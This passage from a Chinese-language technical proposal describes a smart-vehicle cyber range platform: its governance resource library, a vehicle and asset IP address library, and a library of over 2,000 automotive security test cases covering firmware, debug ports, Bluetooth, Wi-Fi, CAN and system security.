APT团伙的活动，并及时采取反制措施。</p><p><strong>APT团伙技战法归纳</strong></p><p>支持显示APT团伙的技战法归纳，展示相应团伙常用的攻击手法等信息。这些信息将帮助了解不同团伙的攻击方式和模式，从而更好地应对潜在的威胁。</p><p><strong>同步靶场记录的攻击者信息</strong></p><p>支持同步靶场记录的攻击者信息数据及攻击行为等数据。这样，可以将实际的攻击情况与攻击者库中的信息进行比对和分析，以更好地了解攻击者的行为和特征。</p><h3 id="智能汽车网络靶场治理资源库"><a href="#智能汽车网络靶场治理资源库" class="headerlink" title="智能汽车网络靶场治理资源库"></a>智能汽车网络靶场治理资源库</h3><p>智能汽车网络靶场治理资源库对于网络空间治理和应急指挥业务相关的资源。</p><h4 id="功能实施方案-18"><a href="#功能实施方案-18" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>通过与SRC平台、漏洞管理及检测平台数据对接，向安全运营平台提供数据基础，结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源，治理资源包含涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。通过与SRC平台、漏洞管理及检测平台数据对接，可以更准确地了解企业和组织的网络环境和资产情况，以及可能存在的安全隐患和威胁。结合治理资源库，为安全运营平台的通报处置、应急指挥等业务提供基础数据资源。治理资源库中的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等信息，可以帮助安全运营平台更好地了解和评估安全事件的影响和紧急程度，进一步采取相应的处置措施和预防措施，从而降低安全风险和损失。</li><li>治理资源库包括应急预案（包含DDOS、重大开源组件漏洞等事件预案），应急处置流程及运营流程SOP。治理资源库是一个综合性的数据库，其中包括了各种应急预案和相应的处置流程及运营流程SOP，应急预案是针对不同类型的安全事件而制定的应急处理计划，包含DDOS、重大开源组件漏洞等事件预案，明确应急响应的步骤和措施，这些预案包括了识别、分类、报告、处置等环节，以确保在应急情况下能够迅速做出反应并采取适当的措施，保护系统和数据的安全治理资源库中还包含了应急处置流程和运营流程的SOP。</li></ol><h4 id="技术实现内容-18"><a href="#技术实现内容-18" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场治理资源库方案"><a href="#靶场治理资源库方案" class="headerlink" title="靶场治理资源库方案"></a>靶场治理资源库方案</h5><p>治理法规和标准：收集智能汽车网络领域的相关法规、标准和规范，包括国家和地区的法律法规、行业标准、安全规范等。通过与SRC平台、漏洞管理及检测平台数据对接，向安全运营平台提供数据基础，结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源，治理资源包含涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。建立一个法规和标准的数据库，为用户提供参考和遵循的依据。</p><p>治理框架和流程：制定智能汽车网络的治理框架和流程，包括安全管理体系、风险评估流程、安全漏洞报告和处理流程等。提供相应的模板和工具，帮助用户建立和实施有效的治理框架和流程。</p><p>安全建议和最佳实践：收集智能汽车网络领域的安全建议和最佳实践，包括安全配置指南、网络防御策略、安全培训材料等。建立一个安全建议和最佳实践的知识库，为用户提供实用的安全指导和操作指南。</p><p>安全工具和解决方案：整理智能汽车网络领域的安全工具和解决方案，包括入侵检测系统、漏洞扫描工具、安全监控系统等。治理资源库包括应急预案（DDOS、重大开源组件漏洞等事件预案），应急处置流程及运营流程SOP。提供工具的介绍、使用指南和评估报告，帮助用户选择和使用合适的安全工具和解决方案。</p><p>治理案例和教育资源：收集智能汽车网络领域的治理案例和教育资源，包括安全事件的调查报告、安全意识培训材料、安全教育视频等。提供案例分析和教育资源，帮助用户学习和借鉴他人的治理经验和教训。</p><p>用户反馈和贡献：鼓励用户积极参与治理资源库的建设和完善，接受用户的反馈和资源贡献，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>资源搜索和检索：提供一个方便的搜索和检索功能，让用户能够快速找到所需的治理资源。可以根据关键词、标签、分类等进行搜索和筛选，提供相关资源的链接和下载。</p><p><strong>数据对接与基础资源提供</strong></p><p>支持与SRC平台、漏洞管理及检测平台数据的对接，向安全运营平台提供数据基础。通过结合治理资源库，为平台的通报处置、应急指挥等业务提供基础数据资源。这些资源包括涉及的资产数据、风险事件类型、事件级别、资产级别、资产责任人、处置建议等。通过这些数据，可以更好地了解网络空间的风险情况，并采取相应的治理措施。</p><p><strong>应急预案和处置流程</strong></p><p>支持治理资源库的应急预案，至少包含DDOS、重大开源组件漏洞等事件预案。预案将提供详细的应急处置流程和运营流程SOP，以帮助在紧急情况下迅速响应和处理安全事件。这些预案和流程将指导的团队进行应急指挥和治理操作，确保网络空间的安全和稳定。</p><h3 id="智能汽车网络靶场IP地址库"><a href="#智能汽车网络靶场IP地址库" class="headerlink" title="智能汽车网络靶场IP地址库"></a>智能汽车网络靶场IP地址库</h3><p>具备汽车靶场平台所有车辆及平台资产的IP信息，通过IP信息可实现对资产的关联管理。</p><h4 id="功能实施方案-19"><a href="#功能实施方案-19" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>IP地址库包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。在IP地址库中，整合前期各大数据平台系统的IP信息，包括各种内部系统和外部系统的IP地址，IP地址库还会包含现有系统各个子系统的IP信息。在复杂的网络环境中，企业可能有多个子系统，每个子系统都有自己的IP地址。通过收集和整理这些信息，可以更有效地进行子系统的管理和监控，及时发现并解决潜在的安全问题；</li><li>IP地址库包含：IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。在IP地址库中，IP地址是最基本的信息，它标识了网络中的每个设备。通过收集和记录IP地址，安全运营平台可以追踪和监控网络活动，并及时发现潜在的安全问题，IP地址库还会包含IP所属单位的名称、地址以及联系人及联系方式等信息，IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式等信息整合到一个库中，可以为安全运营平台提供一个集成的资源，帮助他们更全面地了解和管理网络环境中的IP地址；</li><li>IP地址包含所有车辆零部件（TBOX、车机系统）IP信息管理，包含车辆ID数据。这样的IP地址库针对汽车行业的特定需求进行了定制，旨在提供一个全面而准确的资源，以便车辆制造商和相关服务提供商更好地管理和监控车辆网络环境中的IP地址。</li></ol><h4 id="技术实现内容-19"><a href="#技术实现内容-19" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场IP地址库方案"><a href="#靶场IP地址库方案" class="headerlink" title="靶场IP地址库方案"></a>靶场IP地址库方案</h5><p>IP地址收集：建立一个IP地址收集机制，获取智能汽车网络中的相关IP地址信息。IP地址库包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。可以通过扫描智能汽车网络、监测网络流量、收集网络日志等方式获取IP地址。</p><p>IP地址分类和归档：对收集到的IP地址进行分类和归档，建立一个结构化的IP地址库。IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。可以按照IP地址的用途、所属组织、地理位置等进行分类，方便用户进行IP地址搜索和筛选。</p><p>IP地址描述和分析：对每个IP地址进行详细的描述和分析，包括IP地址的功能、所属组织、网络拓扑等信息。可以对IP地址进行漏洞扫描、安全评估和风险评估，为用户提供有关IP地址的安全情报和威胁分析结果。</p><p>IP地址管理和更新：建立一个IP地址管理系统，对IP地址信息进行版本管理和更新。IP地址包含所有车辆零部件（TBOX、车机系统）IP信息管理，包含车辆ID数据。及时跟踪IP地址的变动、新增的IP地址等，确保IP地址库的及时更新和IP地址信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与IP地址库的建设和完善，接受用户的反馈和IP地址信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>IP地址可视化和报告：提供IP地址可视化的功能，以图表、图形等形式展示IP地址的统计数据和趋势分析。同时，生成详细的IP地址报告，包括IP地址分析结果、安全建议等，帮助用户更好地理解和应对IP地址相关的安全威胁。</p><p><strong>IP地址库的完整性</strong></p><p>将包含前期各大数据平台系统IP，以及现有系统各子系统的IP信息。通过建立完整的IP地址库，可以准确地追踪和管理所有相关资产的IP信息。</p><p><strong>IP地址库的信息内容</strong></p><p>将提供详细的IP地址库信息，包括IP地址、运营商、IP所属单位名称、IP所属单位地址、IP所属单位联系人及联系方式。这些信息将帮助准确地了解每个IP地址的所属单位和相关联系人，以便进行关联管理和沟通。</p><p><strong>车辆零部件IP信息管理</strong></p><p>将特别包含车辆零部件（如TBOX、车机系统）的IP信息管理。这将帮助对每个车辆的零部件IP进行跟踪和管理，并与其他资产进行关联。此外，还支持车辆ID数据的管理，以确保对车辆的唯一标识和关联管理。</p><h1 id="智能汽车网络靶场测试用例库"><a href="#智能汽车网络靶场测试用例库" class="headerlink" title="智能汽车网络靶场测试用例库"></a>智能汽车网络靶场测试用例库</h1><h2 id="技术路线-3"><a href="#技术路线-3" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="测试用例开发"><a href="#测试用例开发" class="headerlink" title="测试用例开发"></a>测试用例开发</h3><h4 id="功能实施方案-20"><a href="#功能实施方案-20" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>测试用例的设计是基于经过严格审查的测试策略，它们是确保软件性能和功能符合预期的关键工具。每个测试用例都有一个描述性的名称，它概括了测试的焦点，并且配备了一个唯一的标识符（ID），以便于在整个软件开发和测试周期中追踪和管理。这些测试用例以文档的形式详尽地记录了测试的目的和整个过程，存储在Word或Excel文件中，以支持团队成员之间的有效沟通和协作。</p><ol><li>测试用例 ID：一个独特的标识符，用于无歧义地识别和跟踪每个测试用例。它方便测试团队成员在测试过程中引用、讨论和报告特定的测试用例，同时也使得在测试库中的搜索、排序和维护工作更加高效和有序。此外，测试用例ID是连接测试计划、测试执行、缺陷跟踪和测试报告等多个测试活动的关键链接。</li><li>测试用例名称：为了描述测试场景或功能的特定情况而给予的唯一标识。通过测试用例名称，可以清楚地了解该用例所涉及的功能、输入数据、预期结果以及其他相关信息。它通常是简洁而具体的，以便于在测试计划和执行中进行有效的引用和跟踪。</li><li>测试目的：在测试周期中进行的一项关键活动，旨在检查是否符合预期的需求和质量标准。它通过执行测试用例来发现潜在的缺陷和错误，并提供反馈给开发人员以便及时修复。</li><li>初始条件：在执行测试用例之前需要满足的特定环境、状态或配置。它包括软件、硬件、网络和其他相关资源的设置和准备工作。</li><li>测试工具：用于支持和辅助软件测试活动的软件应用程序或平台。它们旨在让测试人员更加高效和准确地执行测试任务，提高测试覆盖率和测试质量。测试工具可以自动化测试过程，减少测试成本和时间，并且可以生成有用的测试报告和度量数据。</li><li>参考标准：在软件开发和测试过程中被广泛接受和认可的规范、指南或方法。它们提供了一套共同的准则和最佳实践，用于帮助开发人员和测试人员在设计、开发和测试软件时遵循统一的标准。</li><li>用例来源：获取、定义和识别测试用例的途径和方法。用例来源包括但不限于需求文档、用户反馈、设计文档、经验和专家知识等多种方式</li><li>测试步骤：在软件测试过程中执行的一系列有序操作。它们用于验证和评估软件的功能、性能和质量，以确保软件符合预期需求和质量标准。测试步骤的一般流程包括计划测试、准备测试环境、设计测试用例、执行测试用例、记录测试结果、分析问题和错误、报告测试结果和修复问题等。</li><li>评价方法：在软件开发和测试过程中用于评估和判断软件质量、性能和功能的方法和工具。常见的评价方法包括功能测试、性能测试、安全测试、用户体验评估和可靠性评估等。通过这些方法，可以全面评估软件各个方面的表现，发现问题和风险，并提供改进和优化的方向，以保障软件的质量和用户满意度。</li><li>漏洞危害：在软件或系统中存在的安全漏洞可能引发的严重后果和风险。这些漏洞可以被黑客或恶意攻击者利用，造成个人隐私泄露、机密信息被窃取、系统瘫痪、服务中断、金融损失甚至社会混乱等一系列不良影响。</li><li>修复建议：针对软件或系统中存在的漏洞或安全隐患，提出的具体措施和建议，旨在修复漏洞、加强安全性，并减少潜在的安全风险。</li></ol><h3 id="测试策略及测试规范开发方案"><a href="#测试策略及测试规范开发方案" class="headerlink" title="测试策略及测试规范开发方案"></a>测试策略及测试规范开发方案</h3><h4 id="功能实施方案-21"><a href="#功能实施方案-21" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>示例包括零部件信息安全和整车信息安全测试用例及测试规范，如下所示。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a8d7217f1a01a88c1b680728a32b2afc.png" alt="1694345295068"></p><p>整车测试用例及测试规范示例</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/560c02a8b8783856af43a319494a3e48.png" alt="1694345660317"></p><p>零部件测试用例及测试规范示例</p><ol><li>这些测试策略该包括测试的范围、目标、方法、工具和时间等方面的规划。并对该文档进行审核和确认，确保测试策略符合要求和期望，一旦测试策略得到确认，将进行测试规范的开发，即根据测试策略的要求，制定详细的测试规范，包括测试环境的搭建、测试用例的设计、测试数据的准备等，以确保测试过程的可控性和有效性。</li><li>在前期阶段，根据测试策略，需要将合理地将信息安全和数据安全的单控制器及系统目标划分为不同的测试用例。通过这样的方式，能够全面覆盖各个方面的测试需求，并确保测试的全面性和有效性。最终，将根据这些测试用例形成详尽的测试规范。</li><li>定制测试用例。每个测试用例都将包括测试ID、测试用例名称、测试目的、初始条件、操作步骤、评价方法、漏洞危害、修复建议、以及测试属性（如测试环境、测试方法等）等详细内容。</li></ol><p>测试ID：</p><p>每个测试用例都应有一个唯一的标识符（ID），用于跟踪和引用。这个ID在管理测试用例和测试结果时非常重要。</p><p>测试用例名称：</p><p>测试用例的名称应该简洁且描述性强，能够清楚地表明这个测试用例的目的或测试的特定功能。</p><p>测试目的：</p><p>测试目的详细说明了测试用例的目标，即希望通过这个测试用例验证或确认什么功能、性能或安全要求。</p><p>初始条件：</p><p>在测试开始之前，系统应处于什么状态或环境设置。这可能包括硬件配置、软件版本、网络状态等。</p><p>操作步骤：</p><p>这是执行测试用例的详细步骤。它应该包括每一步的具体操作，以及预期的系统响应，以便测试人员能够准确重现。</p><p>评价方法：</p><p>描述如何评价测试结果，包括成功的标准是什么以及如何判断测试是否通过。</p><p>漏洞危害：</p><p>如果测试用例是针对安全漏洞的，应该描述该漏洞可能造成的危害，包括对系统的潜在影响。</p><p>修复建议：</p><p>对于发现的问题，提供可能的修复建议或解决方案，帮助开发团队快速定位并解决问题。</p><p>测试属性：</p><ul><li>测试环境：详细描述测试应在什么环境下进行，包括硬件、软件、网络配置等。</li><li>测试方法：说明采用的测试方法，如手动测试、自动化测试、白盒测试、黑盒测试等。</li></ul><ol><li>确保测试用例的全面覆盖，包括但不限于GB《整车信息安全技术要求》、WP.29 R155、《电动汽车远程服务与管理系统信息安全技术要求及试验方法》、《车载信息交互系统信息安全技术要求及试验方法》、《汽车网关信息安全技术要求及试验方法》、《汽车软件升级通用技术要求》等，同时还需结合原有的测试用例库进行深度定制，以确保测试用例的针对性和适用性。</li><li>将测试用例按照不同的测试场景和测试目的进行分类，以确保测试的全面性和有效性，确保测试用例的复杂程度适当，使测试人员能够轻松理解和操作，测试用例数量及复杂程度将在覆盖全部测试需求的基础上，提供测试用例数量达2300余条。</li></ol><h3 id="用例库-1"><a href="#用例库-1" class="headerlink" title="用例库"></a>用例库</h3><h4 id="零部件和集成测试用例库方案"><a href="#零部件和集成测试用例库方案" class="headerlink" title="零部件和集成测试用例库方案"></a>零部件和集成测试用例库方案</h4><h5 id="功能实施方案-22"><a href="#功能实施方案-22" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>常规检测：含电路板的焊接触点和各接口（JTAG、UART及其他敏感测试接口）等检测：对电路板焊接触点和各种接口进行测试，以确保它们的连接质量和可靠性。同时，对敏感测试接口如JTAG、UART等进行检测，以防止未经授权的访问和潜在的安全漏洞；芯片安全检测：对芯片进行安全评估和测试，以发现可能存在的漏洞、后门或恶意代码；存储固件检测：对车辆的存储固件进行检测，包括操作系统、应用程序和驱动程序等。敏感存储及各系统固件等检测：确保系统中存储的敏感信息和固件代码的安全性和完整性。这包括确保敏感数据如加密密钥、凭证、个人信息等得到适当的保护，以及确保固件未被篡改，且没有已知的安全漏洞；这些检测旨在发现潜在的漏洞、安全隐患或恶意代码，并采取相应的安全措施进行修复和保护。总线检测：确保数据在总线上的传输是安全的。检测总线网关机制是为了验证数据流经不同网络段（如控制网关和数据网关）时的安全性。总线接口安全防护措施检测则是为了确保总线接口不会被恶意利用，能够抵御潜在的攻击；总线网关机制检测和总线接口安全防护措施检测：对车辆的总线系统进行检测，包括总线通信协议、总线网关机制和总线接口安全防护措施等。这些检测旨在确保总线系统的安全性和防护能力，防止未经授权的访问或恶意攻击。I/O安全检测：对车辆的输入/输出（I/O）接口进行检测，包括端口访问策略和安全防护措施等。这些检测旨在确保I/O接口的安全性，并采取相应的安全措施，以防止未经授权的数据传输或潜在的攻击。端口访问策略及安全防护措施检测：端口访问策略及安全防护措施检测旨在确保只有授权的流量能够通过网络和系统端口，通过实施严格的访问控制、端口安全配置、活动监控和入侵检测机制，来防止未授权访问和保护系统免受潜在的网络攻击。</li><li>硬件安全检测，包含硬件参数功能单元信息泄露检测：对车辆各种硬件参数、功能单元进行分析和测试，以发现潜在的信息泄露漏洞或其他安全隐患；硬件调试接口是否在量产后保留检测：对车辆的硬件调试接口进行评估，以确保在车辆量产后这些接口是否被保留，防止未经授权的访问和攻击；调试接口安全防护检测：对车辆的调试接口进行安全评估和测试，以确保它们的安全性和可靠性，并采取相应的防护措施，以防止未经授权的访问或攻击；eSIM卡接口安全检测：对车辆中的eSIM卡接口进行评估和测试，以确保其安全性和防护能力，并采取相应的安全措施，以防止潜在的攻击和数据泄露；4G模组固件提取检测：对车辆中的4G模组固件进行提取和测试，以发现可能存在的漏洞、后门或恶意代码，并采取相应措施进行修复和保护；USB接口安全防护检测：对车辆中的USB接口进行评估和测试，以确保其安全性和可靠性，并采取相应的安全措施，以防止未经授权的数据传输和攻击；存储器内容提取检测：对车辆的存储器进行评估和测试，以发现可能存在的数据泄露漏洞或其他安全隐患，并采取相应措施进行修复和保护。</li><li>固件安全检测，固件算法分析检测：对固件的信息安全加以分析，以便于开发者能够详尽地评估和验证固件中的算法是否具有潜在的安全漏洞；密钥硬编码检测：靶标能够辨识和评估代码中可能存在的硬编码密钥；服务接口访问安全：测试靶标能够对内部的服务接口进行深入的安全评估，防止任何未经授权的访问尝试，以及对数据完整性的潜在威胁；隐藏后门：能够精准地识别并报告可能存在于内部的任何隐蔽后门；敏感数据：确保靶标能够有效地识别和标记出任何可能被嵌入到系统中的敏感信息，如私密凭证、加密密钥或个人用户数据；配置文件安全：确保这些配置文件没有被设置为可能威胁系统安全的状态；固件提取分析，逆向，篡改后再次刷写：对固件进行提取并进行逆向分析，并进行篡改，然后再次进行刷写，以发现潜在的漏洞或其他安全风险，对设备固件进行全面分析和评估，以寻找潜在的漏洞和弱点，并采取相应的措施对固件进行加固，提高其安全性，防止恶意攻击和未经授权的访问。固件加固安全：确保固件在设计和实施过程中的每一个环节都经过了严格的安全审计。</li><li>系统安全检测：Root检测：Root检测的目的是为了验证移动设备是否经过了提权操作，从而保证设备的系统安全性，防止未授权的修改和访问；Root防御：为了阻止未授权的Root访问，保护设备免受恶意软件和病毒的影响，确保用户数据和系统设置的安全；系统修复：在系统遭受损坏或功能异常时恢复其正常状态，以保持系统的稳定性和可靠性；系统防篡改检测：为了发现并阻止对系统关键部分的未授权更改，确保系统完整性和信任链的维护；系统启动安全检测：在设备启动过程中验证系统的完整性，防止恶意代码在启动时被加载；安全启动：检测系统在启动过程中进行身份验证和完整性检查，防止恶意软件或固件的运行；Bootloader防篡改检测：检测Bootloader是否被篡改或替换，防止恶意软件获取系统控制权；系统漏洞检测：识别和评估系统中存在的安全漏洞，以便及时修补，防止潜在的安全威胁；权限等级设置检查：确保系统中的权限设置符合安全策略，防止未授权的访问和操作；内存隔离安全性测试：验证不同应用程序和系统进程之间的内存区域是否得到了适当的隔离，以防止数据泄露和恶意攻击；应用授权管理安全性测试：确保应用程序的授权机制能够有效管理权限，防止越权行为；系统服务安全性测试：检查系统后台服务的安全性，确保它们不会成为系统漏洞的入口点。</li><li>数据存储安全检测：包含数据加密存储检查，检测内容包含配置参数、日志数据等敏感信息是否做了加密存储；数据完整性检测：数据存储内容是否完整；敏感数据访问控制检测：敏感信息是否会被非授权访问；数据存取错误反馈检测：存储数据提取，是否返回值错误；密钥管理检测：检测密钥生成和管理的安全性，防止密钥泄露或被攻击者获取；敏感数据残留检测：敏感数据清除/销毁后，是否有残留或能被恢复检测。</li><li>对外通信接口检测：网络通道，防火墙检测：包含评估车辆系统与外部网络之间的通信通道和防火墙设置，确保只有授权的网络连接和数据流量能够通过，并防止未经授权的访问和攻击；USB端口，USB刷新软件安全策略检测，防伪造软件升级：检测车辆中的USB接口是否存在安全隐患，如恶意软件的注入、数据泄露等，同时，对USB刷新软件进行安全策略检测，确保只有合法的、经过验证的软件能够通过USB接口进行升级；UART调试端口刷新软件安全策略检测：检测车辆中的UART调试接口是否存在安全风险，如未经授权的访问、恶意指令注入等。同时，对UART调试端口刷新软件进行安全策略检测，确保只有合法的、经过验证的软件能够通过UART接口进行升级；接口模糊测试：对车辆系统的通信接口进行模糊测试，进行未知漏洞的挖掘。</li><li>调试端口检测：包含JTAG刷新软件安全策略检测，防伪造软件升级：对车辆系统中的JTAG接口进行安全策略检测，防止未经授权的软件通过JTAG接口进行固件刷写和调试；SPI/UART刷新软件安全策略检测：对车辆系统中的SPI或UART接口进行安全策略检测，防止未经授权的软件通过此接口进行固件刷写和调试；UART刷新软件安全策略检测：对车辆系统中的UART接口进行安全策略检测，防止未经授权的软件通过UART接口进行固件刷写和调试。</li><li>车内通信安全检测：包含与CAN上车内控制单元的安全策略检测：检测与CAN上的车内控制单元之间的通信安全策略，这包括确保只有授权的ECU可以发送和接收CAN消息，防止未经授权的访问和恶意干扰；与其他ECU通信的安全策略检测：检测与其他ECU之间的通信安全策略，包括验证和授权机制、数据加密和防止未经授权的访问等措施，以保护通信的安全性和可靠性。</li><li>日志检测，应用程序日志内容检测：通过收集应用程序生成的日志数据，使用日志分析工具，对日志进行解析和处理，以提取关键信息和特征，包括检测异常行为、安全事件、潜在威胁等。</li><li>蓝牙检测，经典蓝牙已知漏洞POC检测：对已知的经典蓝牙漏洞进行poc检测，包括蓝牙协议栈的漏洞、配对机制的漏洞等；配对机制校验：检查蓝牙设备的配对机制是否安全；指令合法性校验：检测蓝牙通信中传输的指令的合法性，防止恶意指令的注入和执行；弱密码检测：检测蓝牙设备中使用的弱密码，以防止密码被猜解或暴力破解；敏感数据嗅探：检测蓝牙通信中传输的敏感数据是否受到嗅探攻击的风险；低功耗蓝牙协议栈漏洞测试：对低功耗蓝牙（BLE）协议栈的安全性进行测试，包括BLE协议栈的漏洞、配对过程的安全性等；通信数据重放检测：检测蓝牙通信中的数据重放攻击，即攻击者通过重复发送已经捕获的数据包来模拟合法的通信；通信数据明文测试：检测通信数据传输时是否以明文形式进行的；通信数据加密传输安全性测试：检测数据传输时所使用的加密机制的方式是否合理与安全；BLE鉴权密钥破解：对BLE通信中的鉴权密钥进行破解尝试，以评估设备的安全性；配对模式安全性测试：检测蓝牙设备的配对模式的安全性，包括简单配对、数字签名等；BD_ADDR防读取测试：检测蓝牙设备的BD_ADDR是否容易被读取；通信连接占用测试：检测蓝牙设备与其他设备之间的通信连接是否容易被占用；控车身份伪冒测试：对与车辆相关的蓝牙设备进行身份伪冒测试，以评估车辆控制的安全性。</li><li>WiFi检测，包含无线Wi-Fi认证安全测试：使用WiFi安全测试工具对WiFi进行认证安全测试，包括WEP、WPA、WPA2、WPA3、暴力破解、字典攻击、重放攻击等方式来测试认证的强度和安全性；无线Wi-Fi驱动安全性分析：使用WiFi安全测试工具对WiFi驱动安全进行测试，包括发现的漏洞、弱点和建议的修复措施，根据报告中的信息，采取相应的措施来提高驱动程序的安全性，减少潜在的攻击面和风险；无线Wi-Fi通信安全测试：使用WiFi安全测试工具进行通信安全测试，通过监听和分析无线数据包，检测是否存在未加密的通信、弱加密算法或其他潜在的安全漏洞；无线Wi-Fi拒绝服务攻击测试：使用WiFi安全测试工具进行拒绝服务攻击测试，评估无线Wi-Fi网络的抗拒绝服务（DoS）攻击能力以及网络的稳定性和恢复能力。</li><li>业务安全检测，包含包含转发策略检测：对网络中的转发策略进行评估和测试，以确保网络中的数据包按照预期的规则进行正确转发；错误帧网关隔离记录：对网络中的错误帧进行监测、记录和隔离进行检测。</li><li>域控制器权限控制安全检测，包含总线访问权限：检测总线上的数据传输和通信进行控制的权限，避免攻击者通过非法手段对总线进行非法操作或访问敏感数据；设备接入权限检测：检测连接到域控制器的设备进行控制和管理的权限，确保用户和服务账户仅具有执行其任务所需的最低权限。</li><li>2000余条的零部件测试用例，以用于对零部件的功能、性能和可靠性进行测试和评估。这些测试用例涵盖了各种不同的测试场景和条件，全面检验零部件的各项特性和功能是否符合要求。</li></ol><h5 id="技术实现内容-20"><a href="#技术实现内容-20" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><ol><li>确定测试目标</li></ol><p>明确测试的目标和范围。确定要测试的零部件和系统，以及测试的关键功能和性能指标。这有助于确定测试用例的重点和覆盖范围。</p><ol><li>收集需求和规范</li></ol><p>收集相关的需求文档、规范和设计文档。了解零部件和系统的功能要求、性能要求和接口要求等。这些文档将成为编写测试用例的重要参考。</p><ol><li>制定测试策略</li></ol><p>制定零部件和集成测试的策略和计划。确定测试的级别（单元测试、集成测试、系统测试等），以及测试的方法和技术。考虑使用自动化测试工具和框架来提高效率和一致性。</p><ol><li>编写测试用例</li></ol><p>根据需求和规范，编写详细的测试用例。测试用例应该覆盖不同的功能场景、输入条件和边界条件。确保测试用例具有清晰的预期结果和验证步骤。</p><ol><li>组织测试用例库：将编写的测试用例组织成一个结构化的测试用例库，数量2000余条。可以按照模块、功能、优先级等进行分类和组织。确保测试用例库易于管理和维护，并具有良好的可搜索性和可复用性。</li><li>执行测试用例</li></ol><p>根据测试计划和策略，执行测试用例。记录测试结果、问题和缺陷。使用合适的测试工具和设备进行测试，确保测试环境的准备和配置。</p><ol><li>分析和改进</li></ol><p>分析测试结果和问题，识别潜在的缺陷和改进点。根据测试结果进行调整和改进测试用例和测试策略。持续改进测试用例库，以提高测试效率和质量。</p><ol><li>集成测试用例库</li></ol><p>将零部件和集成测试用例库与其他测试用例库进行集成。确保不同级别的测试用例可以相互补充和覆盖，以实现全面的测试覆盖。</p><ol><li>持续维护和更新</li></ol><p>随着零部件和系统的演进和变化，持续维护和更新测试用例库。跟踪需求和规范的变化，及时更新测试用例以适应新的功能和变更。</p><h4 id="整车用例库方案"><a href="#整车用例库方案" class="headerlink" title="整车用例库方案"></a>整车用例库方案</h4><h5 id="功能实施方案-23"><a href="#功能实施方案-23" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>整车架构安全用例，包含数据安全：数据安全用例关注数据传输、存储和处理过程中的安全性，包括加密算法、身份验证和访问控制机制等；系统安全：系统安全用例涉及操作系统和软件的安全更新、用户身份验证和权限管理、日志记录和安全审计等；车内通信安全：车内通信安全用例关注车辆内部网络通信的安全性，如防止非法访问和数据篡改；USB接口安全：USB接口安全用例考虑USB接口的身份验证、恶意软件防护和加密传输等；车载以太网安全：车载以太网安全用例关注以太网连接的安全性和数据传输的加密和验证；APP应用信息安全：APP应用信息安全用例关注应用软件的身份验证、用户数据隐私保护和防止恶意应用攻击；整车无线电信息安全：整车无线电信息安全用例关注无线电通信的安全传输和防止非法访问；云平台信息安全：云平台信息安全用例关注云平台身份验证、数据传输的加密和隐私保护；整车业务系统安全：整车业务系统安全用例关注整车业务数据的加密和完整性验证、防止非法访问和篡改。</li><li>整车数据安全用例，包含应用配置文件安全：应用配置文件安全用例关注应用程序配置文件的安全性，包括文件加密、权限控制和访问控制等；数据库安全：数据库安全用例涉及到数据库的安全性，包括数据加密、身份验证和访问控制等；日志输出安全：日志输出安全用例关注日志记录的安全性，包括日志加密和访问控制机制等；运行时数据安全：运行时数据安全用例涉及到数据传输和存储过程中的加密和身份验证等；关键密钥安全：关键密钥安全用例考虑到关键密钥的保护和管理，确保其不被恶意攻击所获取；硬件安全芯片及密码管理模块：硬件安全芯片及密码管理模块用例关注硬件安全芯片的安全性能和密码管理模块的可靠性；一机一密检测：一机一密检测用例测试每个车辆是否有唯一的标识码或密钥；访问权限控制测试：访问权限控制测试用例确保车主和授权人员都能够正确访问车辆系统；用户隐私信息存储安全性验证：用户隐私信息存储安全性验证用例关注用户隐私数据的保护和管理，以确保其不被未经授权的第三方所获取；内存敏感信息泄露：内存敏感信息泄露用例关注内存中的数据安全性，防止敏感信息泄露；本地数据安全存储：本地数据安全存储用例确保本地数据的加密和安全存储；数据完整性测试：数据完整性测试用例关注数据传输和存储过程中数据完整性的验证，确保数据从存储到使用全过程的完整性。</li><li>整车系统安全用例，包含服务端口暴露：服务端口暴露用例关注服务端口的安全性，防止未经授权的访问和攻击；服务未授权访问：服务未授权访问用例主要是通过非授权用户对系统中的服务进行访问，检测其是否具备防未授权访问的能力；服务命令执行：服务命令执行用例确保系统中的服务无法被恶意执行命令；已知漏洞扫描：已知漏洞扫描用例主要是对运行中的操作系统进行扫描，检测其是否有已发布但未修复的一直漏洞存在；账户破解：账户破解用例测试系统账户的密码强度和防护机制，以防止恶意攻击者通过破解账户进行非法访问；权限提升：权限提升用例测试系统中的权限管理机制，防止未经授权的用户提升权限；系统防火墙策略及防火墙安全性测试：系统防火墙策略及防火墙安全性测试用例关注系统防火墙的配置和安全性，以确保其有效阻止未经授权的访问和攻击；安全启动安全性测试：安全启动安全性测试用例测试系统的安全启动过程，以防止恶意软件或固件篡改；Linux系统内核功能单元篡改：Linux系统内核功能单元篡改用例测试系统中Linux内核功能单元的完整性，以防止恶意篡改；内存隔离安全性：内存隔离安全性测试用例确保系统中的内存隔离机制有效，防止攻击